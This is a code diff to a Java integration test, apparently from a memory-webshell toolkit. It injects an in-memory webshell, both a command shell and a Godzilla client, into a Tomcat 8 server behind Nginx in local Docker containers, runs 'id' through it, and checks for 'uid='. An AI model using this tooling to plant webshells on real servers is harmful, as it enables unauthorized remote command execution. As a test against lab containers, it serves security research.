@@ -7,13 +7,11 @@ import com.reajason.javaweb.memshell.MemShellResult;
 import com.reajason.javaweb.memshell.ServerType;
 import com.reajason.javaweb.memshell.ShellTool;
 import com.reajason.javaweb.memshell.ShellType;
-import com.reajason.javaweb.memshell.shelltool.command.CommandConfig;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
 import com.reajason.javaweb.packer.Packers;
 import lombok.extern.slf4j.Slf4j;
 import com.reajason.javaweb.utils.tuple.Pair;
-import org.junit.jupiter.api.AfterAll;
 import org.junit.jupiter.api.Test;
 import org.objectweb.asm.Opcodes;
 import org.testcontainers.containers.ComposeContainer;
@@ -24,7 +22,6 @@ import org.testcontainers.junit.jupiter.Testcontainers;
 import java.io.File;
 import java.io.IOException;
 
-import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 import org.junit.jupiter.api.parallel.ResourceLock;
 
@@ -36,23 +33,31 @@ import org.junit.jupiter.api.parallel.ResourceLock;
 @ResourceLock("fixed-port-compose")
 @Testcontainers
 @Slf4j
-public class Tomcat10WebSocketBypassNginxTest {
+public class Tomcat8WebSocketNginxTest {
 
-    public static final String imageName = "tomcat:10.1-jre11";
+    public static final String imageName = "tomcat:8-jre8";
 
     @Container
     public static final ComposeContainer compose =
-            new ComposeContainer(new File("docker-compose/tomcat/docker-compose-10.1-jre11-nginx.yaml"))
+            new ComposeContainer(new File("docker-compose/tomcat/docker-compose-8-jre8-nginx.yaml"))
                     .withExposedService("tomcat", 8080, Wait.forHttp("/app/"))
                     .withExposedService("nginx", 80);
+
+    public static String getUrl() {
+        String host = compose.getServiceHost("nginx", 80);
+        int port = compose.getServicePort("nginx", 80);
+        String url = "http://" + host + ":" + port + "/app";
+        log.info("container started, app url is : {}", url);
+        return url;
+    }
 
     @Test
     public void testWs() {
         String url = getUrl();
         String server = ServerType.TOMCAT;
         String serverVersion = "Unknown";
-        int targetJdkVersion = Opcodes.V11;
-        String shellType = ShellType.JAKARTA_BYPASS_NGINX_WEBSOCKET;
+        int targetJdkVersion = Opcodes.V1_8;
+        String shellType = ShellType.RAW_WEBSOCKET;
         String shellTool = ShellTool.Command;
         String packer = Packers.DefaultBase64;
         Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
@@ -61,14 +66,10 @@ public class Tomcat10WebSocketBypassNginxTest {
         ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
         MemShellResult generateResult = ShellAssertion.generate(urlPattern, server, serverVersion, shellType, shellTool, targetJdkVersion, shellToolConfig, packer);
         ShellAssertion.packerResultAndInject(generateResult, url, shellTool, shellType, packer, null);
-        CommandConfig commandConfig = (CommandConfig) generateResult.getShellToolConfig();
-        // direct connect ws will cause failed
-        assertThrows(IllegalStateException.class, () -> BlockingJavaWebSocketClient.sendRequestWaitResponse(shellUrl, "id"), "WebSocket connection is not open.");
-        // connect by valve bypass will success
-        String response = BlockingJavaWebSocketClient.sendRequestWaitResponseWithHeader(shellUrl, "id", commandConfig.getHeaderName(), commandConfig.getHeaderValue());
+        // Nginx 会剥离 Upgrade 头，由 RawWebSocket helper 自行完成握手
+        String response = BlockingJavaWebSocketClient.sendRequestWaitResponse(shellUrl, "id");
         assertTrue(response.contains("uid="));
     }
-
 
     @Test
     public void testGodzillaWs() {
@@ -76,7 +77,7 @@ public class Tomcat10WebSocketBypassNginxTest {
         String server = ServerType.TOMCAT;
         String serverVersion = "Unknown";
         int targetJdkVersion = Opcodes.V1_8;
-        String shellType = ShellType.JAKARTA_BYPASS_NGINX_WEBSOCKET;
+        String shellType = ShellType.RAW_WEBSOCKET;
         String shellTool = ShellTool.Godzilla;
         String packer = Packers.DefaultBase64;
         Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
@@ -86,31 +87,13 @@ public class Tomcat10WebSocketBypassNginxTest {
         MemShellResult generateResult = ShellAssertion.generate(urlPattern, server, serverVersion, shellType, shellTool, targetJdkVersion, shellToolConfig, packer);
         ShellAssertion.packerResultAndInject(generateResult, url, shellTool, shellType, packer, null);
         GodzillaConfig godzillaConfig = (GodzillaConfig) generateResult.getShellToolConfig();
-        // direct connect ws will cause failed
-        assertThrows(IllegalStateException.class, () -> {
-            try (GodzillaManager godzillaManager = GodzillaManager.builder()
-                    .entrypoint(shellUrl).pass(godzillaConfig.getPass())
-                    .key(godzillaConfig.getKey()).build()) {
-                godzillaManager.start();
-            }
-        }, "WebSocket connection is not open.");
-        // connect by valve bypass will success
         try (GodzillaManager godzillaManager = GodzillaManager.builder()
                 .entrypoint(shellUrl).pass(godzillaConfig.getPass())
-                .key(godzillaConfig.getKey()).header(godzillaConfig.getHeaderName()
-                        , godzillaConfig.getHeaderValue()).build()) {
+                .key(godzillaConfig.getKey()).build()) {
             assertTrue(godzillaManager.start());
             assertTrue(godzillaManager.test());
         } catch (IOException e) {
             e.printStackTrace();
         }
-    }
-
-    public static String getUrl() {
-        String host = compose.getServiceHost("nginx", 80);
-        int port = compose.getServicePort("nginx", 80);
-        String url = "http://" + host + ":" + port + "/app";
-        log.info("container started, app url is : {}", url);
-        return url;
     }
 }
